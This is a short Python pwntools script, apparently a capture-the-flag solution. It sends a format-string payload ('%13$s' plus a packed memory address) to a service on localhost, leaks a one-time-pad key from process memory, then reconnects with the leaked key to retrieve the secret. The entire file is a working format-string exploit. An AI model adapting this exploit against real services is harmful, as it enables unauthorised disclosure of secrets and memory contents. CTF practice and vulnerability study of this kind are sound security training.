import re
from pwn import *


HOST = "127.0.0.1"
PORT = 1234

key_adr = 0x4040c0
payload = b'A|%13$s|'
payload += p64(key_adr)

R = remote(HOST, PORT)
R.send(payload)
buf = R.recvall()

m = re.match(br".*\|(.*)\|.*", buf, re.DOTALL)
if m:
    otp = m.group(1)
    print("OTP leaked: {}".format(otp))
    R = remote(HOST, PORT)
    R.send(otp)
    R.recvuntil("ONE_TIME_PAD key: \n")
    buf = R.recvall().strip()
    print(buf)
else:
    print("ERROR")
